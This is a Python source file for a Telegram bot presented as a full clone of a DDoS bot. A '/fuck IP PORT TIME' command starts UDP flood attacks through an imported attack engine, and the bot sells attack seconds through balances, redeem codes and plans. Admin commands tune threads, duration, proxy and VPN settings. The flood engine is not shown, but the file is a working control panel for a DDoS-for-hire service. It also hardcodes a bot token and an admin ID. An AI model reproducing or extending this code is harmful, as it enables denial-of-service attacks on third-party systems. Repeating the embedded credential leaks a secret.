#!/usr/bin/env python3
# bot.py – Full clone of @wahid_ddosbot, attack command = /fuck

import telebot
import threading
import time
import json
import os
import random
import string
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from attack_engine import AttackEngine

# ======================== CONFIGURATION ========================
BOT_TOKEN = "8762654526:AAFvVEJsFhVJeCCSmlSI6dxLVDNtbe41sTQ"   # Get from @BotFather
ADMIN_ID = "6088159228"     # Get from @userinfobot
# ================================================================

bot = telebot.TeleBot(BOT_TOKEN)
engine = AttackEngine()

# ---------- Global Settings ----------
cooldown = {}
cooldown_seconds = 10
max_threads = 1000
max_duration = 600
vpn_required = False
proxy_enabled = False

# ---------- Data Files ----------
USERS_FILE = "users.json"
CODES_FILE = "codes.json"

def is_admin(user_id):
    return str(user_id) == ADMIN_ID

# ---------- User Data Management ----------
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=4)

def load_codes():
    if os.path.exists(CODES_FILE):
        with open(CODES_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=4)

def get_user_balance(user_id):
    users = load_users()
    uid = str(user_id)
    if uid in users:
        return users[uid].get('balance', 0)
    return 0

def deduct_balance(user_id, seconds):
    users = load_users()
    uid = str(user_id)
    if uid in users and users[uid].get('balance', 0) >= seconds:
        users[uid]['balance'] -= seconds
        save_users(users)
        return True
    return False

def add_balance(user_id, seconds):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {'balance': 0, 'plan': 'Free'}
    users[uid]['balance'] = users[uid].get('balance', 0) + seconds
    save_users(users)

def is_on_cooldown(user_id):
    now = time.time()
    if user_id in cooldown:
        elapsed = now - cooldown[user_id]
        if elapsed < cooldown_seconds:
            return int(cooldown_seconds - elapsed)
    return 0

def set_cooldown(user_id):
    cooldown[user_id] = time.time()

def generate_code(prefix=""):
    chars = string.ascii_uppercase + string.digits
    code = ''.join(random.choices(chars, k=8))
    if prefix:
        code = f"{prefix}_{code}"
    return code

# ---------- Attack Command (renamed to /fuck) ----------
@bot.message_handler(commands=['fuck'])
def fuck_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Usage: `/fuck IP PORT TIME`")
            return
        target_ip = parts[1]
        target_port = int(parts[2])
        duration = int(parts[3])

        if duration < 5 or duration > max_duration:
            bot.reply_to(message, f"⚠️ Time must be 5–{max_duration} seconds")
            return

        remaining = is_on_cooldown(user_id)
        if remaining > 0:
            bot.reply_to(message, f"⏳ Cooldown: wait {remaining} seconds.")
            return

        if get_user_balance(user_id) < duration:
            bal = get_user_balance(user_id)
            bot.reply_to(message, f"❌ Insufficient balance – you have {bal} seconds.")
            return

        if not deduct_balance(user_id, duration):
            bot.reply_to(message, "❌ Balance deduction failed.")
            return

        set_cooldown(user_id)

        success, msg = engine.start_attack(
            user_id, target_ip, target_port, duration, max_threads
        )
        bot.reply_to(message, msg)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# ---------- Stop command ----------
@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized.")
        return
    if engine.stop_attack(user_id):
        bot.reply_to(message, "⏹️ Attack stopped.")
    else:
        bot.reply_to(message, "❌ No active attack.")

# ---------- Status command ----------
@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized.")
        return
    if engine.is_attack_running(user_id):
        bot.reply_to(message, "⚡ Attack is running...")
    else:
        bot.reply_to(message, "📊 No active attack.")

# ---------- Balance command ----------
@bot.message_handler(commands=['balance'])
def balance_command(message):
    user_id = message.from_user.id
    bal = get_user_balance(user_id)
    bot.reply_to(message, f"💰 Your balance: {bal} seconds")

# ---------- Redeem command ----------
@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = str(message.from_user.id)
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /redeem CODE")
            return
        code = parts[1].upper()
        codes = load_codes()
        if code not in codes:
            bot.reply_to(message, "❌ Invalid code.")
            return
        if codes[code].get('used'):
            bot.reply_to(message, "❌ Code already used.")
            return
        seconds = codes[code]['time']
        add_balance(user_id, seconds)
        codes[code]['used'] = True
        save_codes(codes)
        bot.reply_to(message, f"✅ Redeemed! +{seconds}s. New balance: {get_user_balance(user_id)}s")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# ---------- Plan command ----------
@bot.message_handler(commands=['plan'])
def plan_command(message):
    user_id = message.from_user.id
    users = load_users()
    uid = str(user_id)
    if uid in users:
        data = users[uid]
        plan = data.get('plan', 'Free')
        expiry = data.get('expiry', 'None')
        bot.reply_to(message, f"📋 *Plan*\nPlan: {plan}\nBalance: {data.get('balance',0)}s\nExpires: {expiry}", parse_mode="Markdown")
    else:
        bot.reply_to(message, "No plan data found.")

# ---------- Profile command ----------
@bot.message_handler(commands=['profile'])
def profile_command(message):
    user_id = message.from_user.id
    users = load_users()
    uid = str(user_id)
    if uid in users:
        data = users[uid]
        bot.reply_to(message, f"👤 *Profile*\nID: `{user_id}`\nBalance: {data.get('balance',0)}s\nPlan: {data.get('plan','Free')}\nAttacks: {data.get('total_attacks',0)}", parse_mode="Markdown")
    else:
        bot.reply_to(message, "No profile found.")

# ---------- Admin Commands ----------
@bot.message_handler(commands=['adduser'])
def adduser_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /adduser USERID TIME")
            return
        uid = parts[1]
        seconds = int(parts[2])
        users = load_users()
        if uid not in users:
            users[uid] = {'balance': 0, 'plan': 'Premium', 'expiry': (datetime.now()+timedelta(days=30)).isoformat()}
        users[uid]['balance'] = users[uid].get('balance',0) + seconds
        users[uid]['plan'] = 'Premium'
        save_users(users)
        bot.reply_to(message, f"✅ Added {seconds}s to user {uid}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['removeuser'])
def removeuser_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /removeuser USERID")
            return
        uid = parts[1]
        users = load_users()
        if uid in users:
            del users[uid]
            save_users(users)
            bot.reply_to(message, f"✅ User {uid} removed.")
        else:
            bot.reply_to(message, "❌ User not found.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['set_balance'])
def set_balance_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /set_balance USERID TIME")
            return
        uid = parts[1]
        seconds = int(parts[2])
        users = load_users()
        if uid not in users:
            users[uid] = {'balance': 0}
        users[uid]['balance'] = seconds
        save_users(users)
        bot.reply_to(message, f"✅ Balance of {uid} set to {seconds}s")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['gen'])
def gen_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /gen TIME COUNT")
            return
        seconds = int(parts[1])
        count = int(parts[2])
        codes = load_codes()
        new_codes = []
        for _ in range(count):
            code = generate_code()
            codes[code] = {'time': seconds, 'used': False}
            new_codes.append(code)
        save_codes(codes)
        bot.reply_to(message, f"✅ Generated {count} codes with {seconds}s each.\nCodes: `{', '.join(new_codes)}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['set_cooldown'])
def set_cooldown_command(message):
    global cooldown_seconds
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /set_cooldown SECONDS")
            return
        cooldown_seconds = int(parts[1])
        bot.reply_to(message, f"✅ Cooldown set to {cooldown_seconds}s")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['set_threads'])
def set_threads_command(message):
    global max_threads
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /set_threads COUNT")
            return
        max_threads = int(parts[1])
        bot.reply_to(message, f"✅ Max threads set to {max_threads}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['set_duration'])
def set_duration_command(message):
    global max_duration
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "Usage: /set_duration SECONDS")
            return
        max_duration = int(parts[1])
        if max_duration > 300:
            bot.reply_to(message, "⚠️ Max duration cannot exceed 300 seconds.")
            return
        bot.reply_to(message, f"✅ Max duration set to {max_duration}s")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['toggle_vpn'])
def toggle_vpn_command(message):
    global vpn_required
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    vpn_required = not vpn_required
    bot.reply_to(message, f"✅ VPN check toggled: {'ON' if vpn_required else 'OFF'}")

@bot.message_handler(commands=['toggle_proxy'])
def toggle_proxy_command(message):
    global proxy_enabled
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    proxy_enabled = not proxy_enabled
    bot.reply_to(message, f"✅ Proxy mode toggled: {'ON' if proxy_enabled else 'OFF'}")

@bot.message_handler(commands=['users'])
def users_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    users = load_users()
    if not users:
        bot.reply_to(message, "📝 No users found.")
        return
    text = "📋 *User List*\n\n"
    for uid, data in users.items():
        text += f"🆔 `{uid}`\n💰 Balance: {data.get('balance',0)}s\n📅 Plan: {data.get('plan','Free')}\n\n"
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['codes'])
def codes_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    codes = load_codes()
    if not codes:
        bot.reply_to(message, "📝 No codes found.")
        return
    text = "🎫 *Code List*\n\n"
    for code, data in codes.items():
        status = "✅ Used" if data.get('used') else "🟢 Active"
        text += f"`{code}` – {data['time']}s – {status}\n"
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Admin only.")
        return
    msg = message.text.replace('/broadcast', '', 1).strip()
    if not msg:
        bot.reply_to(message, "Usage: /broadcast MESSAGE")
        return
    users = load_users()
    sent = 0
    for uid in users:
        try:
            bot.send_message(uid, f"📢 *BROADCAST*\n\n{msg}", parse_mode="Markdown")
            sent += 1
        except:
            pass
    bot.reply_to(message, f"✅ Broadcast sent to {sent} users.")

# ---------- Help and Start ----------
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Unauthorized.")
        return
    help_text = """
🔥 *FUCK BOT* – *Full clone of @wahid_ddosbot* 🔥

*COMMANDS:*

/fuck IP PORT TIME – Start Fuck UDP attack
/status – Current attack status
/stop – Stop attack
/balance – Your balance
/plan – Plan details
/redeem CODE – Redeem a code
/profile – Your profile

*ADMIN COMMANDS:*
/adduser USERID TIME – Add balance
/removeuser USERID – Remove user
/set_balance USERID TIME – Set exact balance
/gen TIME COUNT – Generate codes
/set_cooldown SECONDS – Set cooldown
/set_threads COUNT – Set threads
/set_duration SECONDS – Set max duration
/toggle_vpn – VPN check ON/OFF
/toggle_proxy – Proxy mode ON/OFF
/users – List all users
/codes – List codes
/broadcast MESSAGE – Broadcast to all

*EXAMPLE:* `/fuck 192.168.1.100 80 30`
    """
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("🔥 Fuck", switch_inline_query_current_chat=""),
        InlineKeyboardButton("📊 Status", callback_data="status")
    )
    markup.row(
        InlineKeyboardButton("⏹ Stop", callback_data="stop"),
        InlineKeyboardButton("💰 Balance", callback_data="balance")
    )
    bot.reply_to(message, help_text, parse_mode="Markdown", reply_markup=markup)

# ---------- Callback handler for inline buttons ----------
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "status":
        status_command(call.message)
    elif call.data == "stop":
        stop_command(call.message)
    elif call.data == "balance":
        balance_command(call.message)
    bot.answer_callback_query(call.id)

# ---------- Unknown command ----------
@bot.message_handler(func=lambda message: True)
def unknown_command(message):
    if is_admin(message.from_user.id):
        bot.reply_to(message, "❓ Unknown command. Type /help for list.")

if __name__ == "__main__":
    print("="*50)
    print("🔥 FUCK BOT STARTED – STRESSANAPI ENGINE")
    print("="*50)
    print(f"Admin ID     : {ADMIN_ID}")
    print(f"Cooldown     : {cooldown_seconds}s")
    print(f"Max threads  : {max_threads}")
    print(f"Max duration : {max_duration}s")
    print("="*50)
    bot.infinity_polling()